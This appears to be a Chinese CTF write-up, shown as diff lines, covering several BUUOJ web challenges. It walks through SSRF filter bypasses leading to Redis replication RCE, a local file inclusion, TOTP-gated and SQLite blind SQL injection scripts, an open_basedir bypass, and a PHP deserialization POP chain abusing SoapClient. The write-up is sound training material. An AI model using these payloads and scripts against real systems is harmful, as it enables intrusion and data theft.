+![](https://img.npfs06.top/20210309224002.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+![](https://img.npfs06.top/20210309224148.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+首先对传入的url进行check_inner_ip检查是否为内网ip地址，这一部分限制了部分协议的使用，使用parse_url解析url，并使用gethostname、ip2long函数获取ip地址以及将ip地址转化为整数，要想返回为false，则不能使用内网ip发送请求。
+通过检查则返回safe_request_url使用curl处理。
+
+
+
+题目提示
+
+> // Please visit hint.php locally.
+
+我们构造如下url传入
+
+```php
+?url=http://0.0.0.0/hint.php
+```
+
+0.0.0.0的IP地址表示整个网络，代表所有主机的ipv4地址，传入绕过
+
+这里用ip进制转换右移进行比较，绕过方法还有：
+
+1.`http://0x7f000001/hint.php`
+
+2.`http://@127.0.0.1./hint.php`(这种方法在比赛时可用，不过BUU不行)
+
+### redis主从复制rce
+
+hint.php内容：
+
+```php
+<?php
+if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
+  highlight_file(__FILE__);
+}
+if(isset($_POST['file'])){
+  file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
+}
+```
+
+得到redis密码为root
+`file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);`可以绕过写shell，不过试了下没有写权限。同理redis写shell也行不通了
+
+尝试请求:
+
+```shell
+?url=dict://0x7f000001:6379/info
+```
+
+返回的数据为：
+
+```shell
+string(73) "-NOAUTH Authentication required.
+-NOAUTH Authentication required.
++OK
+"
+```
+
+说明需要认证，因为dict协议使用比较方便，可以直接在`/`后面跟上redis明文命令执行；可尝试使用dict协议进行认证：
+
+```shell
+?url=dict://0x7f000001:6379/auth+root
+```
+
+返回的数据：
+
+```shell
+string(44) "-NOAUTH Authentication required.
++OK
++OK
+"
+```
+
+说明认证成功
+
+但是dict只能执行一条redis命令，由于执行每个操作之前都要进行认证，那么就要用到可以一次执行多条命令的gopher协议
+
+**使用gopher 探测信息**
+
+空格二次编码后为`%2520`，换行符二次编码后为`%250a`；需要在每条命令后加上换行符
+
+使用payload：
+
+```
+?url=gopher://0.0.0.0:6379/_AUTH%2520root%250ainfo%250aquit
+```
+
+得到redis版本等信息：
+
+```
+# Server
+redis_version:5.0.3
+```
+
+那么很显然是要用到[redis-post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)中提出的redis主从复制rce了
+
+
+
+简单说下原理：
+
+- `slaveof`（新版改为`REPLICAOF`）建立后slave会向master发送`PSYNC`，请求开始复制
+- master可以返回`FULLRESYNC`，进行全量复制，然后将自己持久化的数据发给slave，正常情况下包括`Replication ID`, `offset`，master存储的key-value等等
+- slave会将这些数据保存到config中`dbfilename`指定的文件（默认为dump.rdb），然后再载入。
+- 通过伪造master，可以控制发往slave的信息，从而做到无脏数据写文件
+- 在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件
+- 因此通过FULLRESYNC写入恶意so文件，然后`MODULE LOAD /path/to/mymodule.so`载入模块即可rce
+
+
+
+做法
+
+两篇需要的github地址
+
+[项目1](https://github.com/n0b0dyCN/redis-rogue-server)
+
+[项目2](https://github.com/xmsec/redis-ssrf)
+
+把redis-rogue-server这个项目里的exp.so放在redis-ssrf-master这个项目下!，同时对`ssrf-redis`文件作如下三处修改
+
+```php
+//第一处 125行左右
+elif mode==3:
+        lhost="vpn ip地址"
+        lport="6666"            //这里无需修改，应为要同rogue-server.py文件的端口相对应 
+        command="cat /flag"      //需要执行的命令
+
+```
+
+
+
+```php
+//第二处 140行左右
+	ip="0.0.0.0"   
+    port="6379"
+```
+
+
+
+```php
+//第三处 160行左右
+	# input auth passwd or leave blank for no pw
+    passwd = 'root' 
+```
+
+
+
+![](https://img.npfs06.top/20210310000532.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+将得到的payload二次url编码传参，即可得到flag
+
+![](https://img.npfs06.top/20210310000022.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+
+
+
+
+
+
+## [网鼎杯 2020 半决赛]AliceWebsite
+
+源码下载下来，在index.php中有一个毫无过滤的本地文件包含
+
+```php
+       <?php
+        $action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');
+        if (file_exists($action)) {
+            include $action;
+        } else {
+            echo "File not found!";
+        }
+        ?>
+```
+
+payload:
+
+```
+?action=../../../../../flag
+```
+
+
+
+## [De1CTF 2019]Giftbox
+
+打开是个很炫酷的页面，看样子是个 linux终端, 然后看一下有哪些命令可以调用
+
+![](https://img.npfs06.top/20210310230356.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+经过测试，发现在login处存在sql盲注
+
+![](https://img.npfs06.top/20210310221906.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+但是在写 exp 之前还需要来看看是怎么和服务器通讯的，通过查看数据流我们发现有个 totp参数，且再次提交之后这个 totp 又会发生改变
+
+![](https://img.npfs06.top/20210310231129.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+**TOTP算法 (Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。**
+
+**一些要求：**
+
+**令牌与服务器之间必须时钟同步；**
+**令牌与服务器之间必须共享密钥；**
+**令牌与服务器之间必须使用相同的时间步长**
+**核心算法：**
+**TOTP =Truncate(HMAC-SHA-1(K, (T - T0) / X))**
+**X 是时间间隔**
+
+
+
+我们需要知道密钥
+
+![](https://img.npfs06.top/20210310231536.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+![](https://img.npfs06.top/20210310234243.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+所以重点就是`totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)`也就是长度为8，间隔为5
+
+```python
+import requests
+import pyotp
+import time
+
+totp = pyotp.TOTP("GAXG24JTMZXGKZBU", 8, interval=5)
+chars = "!#$%&()+,-./0123456789?ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}"
+url = "http://a664c97d-663f-494d-a65d-83d2891353c6.node3.buuoj.cn/shell.php?a=login%20admin'/**/and({})and/**/'1'='1%201&totp={}"
+payload = "ascii(mid((select/**/group_concat(password)/**/from/**/users),{},1))>{}"
+result = ""
+r =requests.Session()
+for i in range(1,10000):
+    for char in chars:
+        #print(url.format(payload.format(i,ord(char)), totp.now()))
+        res = r.get(url.format(payload.format(i,ord(char)), totp.now()))
+        print(res.text)
+        if "user" in res.text:
+            result += char
+            print(result)
+            break
+        time.sleep(0.2)
+```
+
+
+
+![](https://img.npfs06.top/20210310223205.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+得到密码：`hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`
+
+
+
+密码里提示有个隐藏命令 `sh0w_hiiintttt_23333` ，可以得到提示 `eval` 在 `launch` 的时候被调用。
+
+![](https://img.npfs06.top/20210310232716.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+`launch` 前需要先用 `targeting` 设置，不过对输入有限制，这里可以 `fuzz` 一下，得知 `code` 限制 `a-zA-Z0-9` ，position限制 `a-zA-Z0-9})$({_+-,.` ，而且两者的长度也有限制。
+
+总结一下每个命令。
+
+- targeting code position =>储存一条 $code = “position”;
+- launch => 将上面 targeting 起来的 code 按照字典序跑一遍。
+- destuct => 清空，恢复初始状态
+
+
+
+这里需要用 `php可变变量` 构造和拼接 `payload` 。
+
+![](https://img.npfs06.top/20210310235106.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+外面包个 {}，里面的东西会被 执行 后拿返回值。变量后面加个 ()，就会尝试调用这个变量里存的名字所指向的函数。
+
+首先读取phpinfo文件
+
+![](https://img.npfs06.top/20210311000258.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+保存，本地html格式打开，就可以看到可视化界面了
+
+![](https://img.npfs06.top/20210311000456.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+这里看到有 open_basedir，得想办法绕过 `open_basedir` 的限制，https://xz.aliyun.com/t/4720
+
+绕过的 payload 如下。
+
+```
+chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
+```
+
+参考网上师傅的脚本
+
+```python
+import requests
+import urllib
+import pyotp
+
+url = 'http://a664c97d-663f-494d-a65d-83d2891353c6.node3.buuoj.cn/shell.php?a=%s&totp=%s'
+totp = pyotp.TOTP("GAXG24JTMZXGKZBU", digits=8, interval=5)
+s = requests.session()
+
+def login(password):
+    username = 'admin'
+    payload = 'login %s %s' % (username, password)
+    payload = urllib.parse.quote(payload)
+    payload = url % (payload, totp.now())
+    s.get(payload)
+
+def destruct():
+    payload = 'destruct'
+    payload = urllib.parse.quote(payload)
+    payload = url % (payload, totp.now())
+    s.get(payload)
+
+def targeting(code, position):
+    payload = 'targeting %s %s' % (code, position)
+    payload = urllib.parse.quote(payload)
+    payload = url % (payload, totp.now())
+    s.get(payload)
+
+def launch():
+    payload = 'launch'
+    payload = urllib.parse.quote(payload)
+    payload = url % (payload, totp.now())
+    return s.get(payload).text
+
+login('hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}')
+destruct()
+targeting('a','chr')
+targeting('b','{$a(46)}')
+targeting('c','{$b}{$b}')
+targeting('d','{$a(47)}')
+targeting('e','js')
+targeting('f','open_basedir')
+targeting('g','chdir')
+targeting('h','ini_set')
+targeting('i','file_get_')
+targeting('j','{$i}contents')
+targeting('k','{$g($e)}')
+targeting('l','{$h($f,$c)}')
+targeting('m','{$g($c)}')
+targeting('n','{$h($f,$d)}')
+targeting('o','{$d}flag')
+targeting('p','{$j($o)}')
+targeting('q','printf')
+targeting('r','{$q($p)}')
+print(launch())
+```
+
+
+
+## [HarekazeCTF2019]Sqlite Voting
+
+
+
+题目还给了一段sql语句，可知flag在flag表里
+
+```sql
+DROP TABLE IF EXISTS `vote`;
+CREATE TABLE `vote` (
+  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
+  `name` TEXT NOT NULL,
+  `count` INTEGER
+);
+INSERT INTO `vote` (`name`, `count`) VALUES
+  ('dog', 0),
+  ('cat', 0),
+  ('zebra', 0),
+  ('koala', 0);
+
+DROP TABLE IF EXISTS `flag`;
+CREATE TABLE `flag` (
+  `flag` TEXT NOT NULL
+);
+INSERT INTO `flag` VALUES ('HarekazeCTF{<redacted>}');
+```
+
+
+
+
+
+```php
+//vote.php
+
+<?php
+error_reporting(0);
+
+if (isset($_GET['source'])) {
+  show_source(__FILE__);
+  exit();
+}
+
+function is_valid($str) {
+  $banword = [
+    // dangerous chars
+    // " % ' * + / < = > \ _ ` ~ -
+    "[\"%'*+\\/<=>\\\\_`~-]",
+    // whitespace chars
+    '\s',
+    // dangerous functions
+    'blob', 'load_extension', 'char', 'unicode',
+    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
+    'in', 'limit', 'order', 'union', 'join'
+  ];
+  $regexp = '/' . implode('|', $banword) . '/i';
+  if (preg_match($regexp, $str)) {
+    return false;
+  }
+  return true;
+}
+
+header("Content-Type: text/json; charset=utf-8");
+
+// check user input
+if (!isset($_POST['id']) || empty($_POST['id'])) {
+  die(json_encode(['error' => 'You must specify vote id']));
+}
+$id = $_POST['id'];
+if (!is_valid($id)) {
+  die(json_encode(['error' => 'Vote id contains dangerous chars']));
+}
+
+// update database
+$pdo = new PDO('sqlite:../db/vote.db');
+$res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
+if ($res === false) {
+  die(json_encode(['error' => 'An error occurred while updating database']));
+}
+
+// succeeded!
+echo json_encode([
+  'message' => 'Thank you for your vote! The result will be published after the CTF finished.'
+]);
+```
+
+分析源代码，发现过滤了很多sql关键字，从`$pdo = new PDO('sqlite:../db/vote.db');`,还知道了这是sqllite 的数据库，且由于过滤了" '所以无法判断是字符型还是整形，
+
+关键点在
+
+> $res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
+
+`UPDATE` 成功与失败分别对应了不同的页面，那么是不是可以进行盲注，但是考虑到它过滤了 `'` 和 `"` 这就无法使用字符进行判断，`char` 又被过滤也无法使用 ASCII 码判断
+
+这里考虑使用 `hex` 进行字符判断，将所有的的字符串组合用有限的 36 个字符表示
+
+**1. 先考虑对 flag 16 进制长度的判断，假设它的长度为 `x`，`y` 表示 2 的 n 次方，那么 `x&y` 就能表现出 `x` 二进制所有为 1 的位置，将这些 `y` 再进行或运算就可以得到完整的 `x` 的二进制，也就得到了 flag 的长度，而 `1<<n` 恰可以表示 2 的 n 次方**
+
+解释下上面这段话的意思：
+
+> <<   左移   用来将一个数的各二进制位全部左移N位，高位舍弃，低位补0
+>
+> 1<<n ，为二进制，但转化为十进制之后就是以2的倍数递增
+
+![](https://img.npfs06.top/20210311173033.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+> &  按位与   对两个整数值执行“位与”运算.它会将第一个操作数的每一位与第二个操作数中对应的每一位进行比较.如果两位都是 1,则相应的结果位设置为 1.否则,相应的结果位设置为 0
+
+两个十进制按位与会先将其转化为二进制，进行按位与后再转回十进制
+
+`x&y`所做的其实就是遍历x中的每一位，举个例子
+
+> x: 01000100
+>
+> y: 00000001    //这个时候 x&y的值为0
+>
+> y: 00000010    //这个时候 x&y的值为0
+>
+> y: 00000100    /这个时候 x&y的值不为0 ，这也就说明了x的第2位为1
+>
+> ......
+>
+> 遍历之后，将所有x&y不为0时的y值进行或运算，也就可以得出x的二进制了
+
+
+
+![](http://img.npfs06.top/20210311224630.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+那么如何构造报错语句呢？在 `sqlite3` 中，`abs` 函数有一个整数溢出的报错，如果 `abs` 的参数是 `-9223372036854775808` 就会报错，同样如果是正数也会报错
+
+判断长度的 payload :
+
+```
+ abs(case(length(hex((select(flag)from(flag))))&{1<<n})when(0)then(0)else(0x8000000000000000)end)
+```
+
+```python
+import requests
+url = "http://7d124b25-63ec-4b08-b8fe-7b3c6f6913fe.node3.buuoj.cn/vote.php"
+l = 0
+for n in range(16):
+    payload = f'abs(case(length(hex((select(flag)from(flag))))&{1 << n})when(0)then(0)else(0x8000000000000000)end)'
+    print(payload)
+    data = {
+        'id': payload
+    }
+
+    r = requests.post(url=url, data=data)
+    print(r.text)
+    if 'occurred' in r.text:
+        l = l | 1 << n
+
+print(l)
+```
+
+运行脚本，我们可以得到flag长度为84
+
+
+
+接下去要做的就是逐字符进行判断，但是 `is_valid()` 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断
+
+这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 `ABCDEF` ，这样十六进制的所有字符都可以使用了，并且使用 `trim(0,0)` 来表示空字符
+
+```bash
+  # 除去 12567 就是 A ，其余同理
+  A = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
+
+  C = 'trim(hex(typeof(.1)),12567)'
+
+  D = 'trim(hex(0xffffffffffffffff),123)'
+
+  # hex(0.1) = 302E31
+  # 除去 1230 就是 E
+  E = 'trim(hex(0.1),1230)'
+  
+  # hex(b'dog') = 646F67
+  # 除去 467 就是 F
+  F = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
+
+  # hex(b'koala') = 6B6F616C61
+  # 除去 16CF 就是 B
+  B = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{C}||{F})'
+```
+
+
+
+- 然后逐字符进行爆破，已经知道 flag 格式为 `flag{}` ，`hex(b'flag{')==666C61677B` ，在其后面逐位添加十六进制字符，构成 paylaod
+- 再利用 `replace(length(replace(flag,payload,''))),84,'')` 这个语句进行判断
+- 如果 flag 不包含 payload ，那么得到的 `length` 必为 84 ，最外面的 `replace` 将返回 `false` ，通过 `case when then else` 构造 `abs` 参数为 `0` ，它不报错
+- 如果 flag 包含 payload ，那么 `replace(flag, payload, '')` 将 flag 中的 payload 替换为空，得到的 `length` 必不为 84 ，最外面的 `replace` 将返回 `true` ，通过 `case when then else` 构造 `abs` 参数为 `0x8000000000000000` 令其报错
+- 以上就可以根据报错爆破出 flag，最后附上出题人脚本
+
+
+
+```python
+import binascii
+import requests
+import time
+URL = 'http://9bc57f7c-3543-4dac-9a39-b0d6fe93990f.node3.buuoj.cn/vote.php'
+
+
+l = 84
+
+header={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'}
+
+
+table = {}
+table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
+table['C'] = 'trim(hex(typeof(.1)),12567)'
+table['D'] = 'trim(hex(0xffffffffffffffff),123)'
+table['E'] = 'trim(hex(0.1),1230)'
+table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
+table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'
+
+
+res = binascii.hexlify(b'flag{').decode().upper()
+for i in range(len(res), l):
+  for x in '0123456789ABCDEF':
+    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
+    r = requests.post(URL, data={
+      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
+    },headers=header)
+    if 'An error occurred' in r.text:
+      res += x
+      break
+    time.sleep(0.06)
+  # print(f'[+] flag ({i}/{l}): {res}')
+  print('flag(hex): ',res)
+  i += 1
+# print('[+] flag:', binascii.unhexlify(res).decode())
+print(binascii.unhexlify(res).decode())
+```
+
+
+
+
+
+## [MRCTF2020]Ezpop_Revenge
+
+**知识点：**
+
+1. **代码审计**
+2. **SOAP 反序列化**
+3. **SSRF**
+4. **CRLF**
+
+题目打开是个 typecho 博客，www.zip 泄露，下载得到源码。全局搜了一下`flag`，搜到了两个有用的东西，一个假flag，另一个是flag.php
+
+```php
+//flag.php
+<?php
+if(!isset($_SESSION)) session_start();
+if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
+   $_SESSION['flag']= "MRCTF{******}";
+}else echo "我扌your problem?\nonly localhost can get flag!";
+?>
+```
+
+暗示这是一个 SSRF 题
+
+因为是 POP 链问题，先找反序列化位点,全局搜索：unserialize
+
+跟进到Plugin.php,代码比较多，简化一下，这个 Plugin.php 中的核心代码如下：
+
+```php
+<?php
+class HelloWorld_DB{
+    private $flag="MRCTF{this_is_a_fake_flag}";
+    private $coincidence;
+    function  __wakeup(){
+        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
+    }
+}
+class HelloWorld_Plugin implements Typecho_Plugin_Interface
+{
+	public function action(){
+        if(!isset($_SESSION)) session_start();
+        if(isset($_REQUEST['admin'])) var_dump($_SESSION);
+        if (isset($_POST['C0incid3nc3'])) {
+			if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($_POST['C0incid3nc3'])) === 0)
+				unserialize(base64_decode($_POST['C0incid3nc3']));
+			else {
+				echo "Not that easy.";
+			}
+        }
+    }
+}
+```
+
+可以看到，`HelloWorld_DB`中的`__wakeup`实例化了一个`Typecho_Db`，传给构造方法的参数是 `$this->coincidence` 数组的两个键值；下面这个类在没有设置session时会开启session，接受到`admin`参数时会输出session，并过滤了`C0incid3nc3`参数的一些RCE及特殊字符，过滤成功则反序列化`C0incid3nc3`，也需要跟进一下`action`函数
+先跟进一下`Typecho_Db`，在var\Typecho\Db.php，此脚本核心代码：
+
+```php
+class Typecho_Db
+{
+    public function __construct($adapterName, $prefix = 'typecho_')
+    {
+        /** 获取适配器名称 */
+        $this->_adapterName = $adapterName;
+
+        /** 数据库适配器 */
+        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
+
+        if (!call_user_func(array($adapterName, 'isAvailable'))) {
+            throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");//__toString()
+        }
+
+        $this->_prefix = $prefix;
+
+        /** 初始化内部变量 */
+        $this->_pool = array();
+        $this->_connectedPool = array();
+        $this->_config = array();
+
+        //实例化适配器对象
+        $this->_adapter = new $adapterName();
+    }
+}
+```
+
+第九行，字符串拼接`__wakeup`实例化的`coincidence['hello']`，我们知道当类被当成字符串拼接时，那就会调用某个类的`__toString`，而这里恰好`$adapterName`可控，再搜`__toString()`，找到`var\Typecho\Db\Query.php`中定义了一大段，核心如下：
+
+```php
+class Typecho_Db_Query
+{
+    private static $_default = array(
+        'action' => NULL,
+        'table'  => NULL,
+        'fields' => '*',
+        'join'   => array(),
+        'where'  => NULL,
+        'limit'  => NULL,
+        'offset' => NULL,
+        'order'  => NULL,
+        'group'  => NULL,
+        'having'  => NULL,
+        'rows'   => array(),
+    );
+    private $_sqlPreBuild;
+    public function __toString()
+    {
+        switch ($this->_sqlPreBuild['action']) {
+            case Typecho_Db::SELECT:
+                return $this->_adapter->parseSelect($this->_sqlPreBuild);
+            case Typecho_Db::INSERT:
+                return 'INSERT INTO '
+                . $this->_sqlPreBuild['table']
+                . '(' . implode(' , ', array_keys($this->_sqlPreBuild['rows'])) . ')'
+                . ' VALUES '
+                . '(' . implode(' , ', array_values($this->_sqlPreBuild['rows'])) . ')'
+                . $this->_sqlPreBuild['limit'];
+            case Typecho_Db::DELETE:
+                return 'DELETE FROM '
+                . $this->_sqlPreBuild['table']
+                . $this->_sqlPreBuild['where'];
+            case Typecho_Db::UPDATE:
+                $columns = array();
+                if (isset($this->_sqlPreBuild['rows'])) {
+                    foreach ($this->_sqlPreBuild['rows'] as $key => $val) {
+                        $columns[] = "$key = $val";
+                    }
+                }
+
+                return 'UPDATE '
+                . $this->_sqlPreBuild['table']
+                . ' SET ' . implode(' , ', $columns)
+                . $this->_sqlPreBuild['where'];
+            default:
+                return NULL;
+        }
+    }
+}
+```
+
+假如`Typecho_Db::SELECT（静态值）`的值为`SELECT`，则跟进`$this->_adapter`
+我们发现这个值我们也是可控的，这个时候我们控制`_adapter`为soap类就可以了
+
+![](https://img.npfs06.top/20210312235301.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+这个时候再访问soap的`parseSelect`方法，但是此方法并不存在，所以就会触发soap的`__call`方法来打到本地访问的目的
+
+**POP 链逻辑：**
+
+- 反序列化 `HelloWorld_DB`，就触发了`__wakeup()` 方法，在`__wakeup()` 内实例化 `Typecho_Db` 并以 `$this->coincidence['hello']` 作为 `Typecho_Db` 的`__construct()` 方法的第一个参数；
+- PHP 的数组是可以存对象，假设 `$this->coincidence['hello']` 实例化 `Typecho_Db_Query` 对象，在 `Typecho_Db` 的构造方法中将其作为字符串，就触发了 `Typecho_Db_Query` 的`__toString()` 方法；
+- 在`__toString()` 内，如果 `$_sqlPreBuild['action']` 为`'SELECT'` 就会触发 `$_adapter` 的 `parseSelect()` 方法；
+- 将 `$_adapter` 实例化为 `SoapClient`，调用 `parseSelect()` 是不存在的方法，触发了 `SoapClient` 的`__call()` 魔术方法
+- `__call()` 是实现 SSRF 的关键
+
+
+
+POP 链清楚了，exp 就很好写
+
+payload:
+
+```php
+<?php
+class HelloWorld_DB{
+    private $coincidence;
+    public function __construct(){
+        $this->coincidence=(['hello'=>new Typecho_Db_Query()]);
+    }
+}
+class Typecho_Db_Query
+{
+    private $_sqlPreBuild;
+    private $_adapter;
+    public function __construct(){
+        $this->_sqlPreBuild['action']='SELECT';
+        $target = "http://127.0.0.1/flag.php";
+        $headers = array(
+            'Cookie: PHPSESSID=i32jvsqtg8a2011jtcgefk8ko1',
+        );
+        $this->_adapter=new SoapClient(
+            null,
+            array('location' => $target,
+                'user_agent'=>str_replace('^^', "\r\n",'npfs^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers)),'uri'=>'hello'));
+    }
+
+}
+$a = serialize(new HelloWorld_DB());
+echo base64_encode($a);
+```
+
+生成的payload Post传参
+
+![](https://img.npfs06.top/20210313001503.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+还有最后一个问题，这个插件现在还不知道在哪调用，不知道在哪执行就不能反序列化。在 /var/Typecho/Plugin.php 中有如下路由代码：
+
+```php
+public static function activate($pluginName)
+{
+    self::$_plugins['activated'][$pluginName] = self::$_tmp;
+    self::$_tmp = array();
+    Helper::addRoute("page_admin_action","/page_admin","HelloWorld_Plugin",'action');
+}
+```
+
+所以来到`/page_admin`，带上 admin 参数来输出 session 即可得到 flag
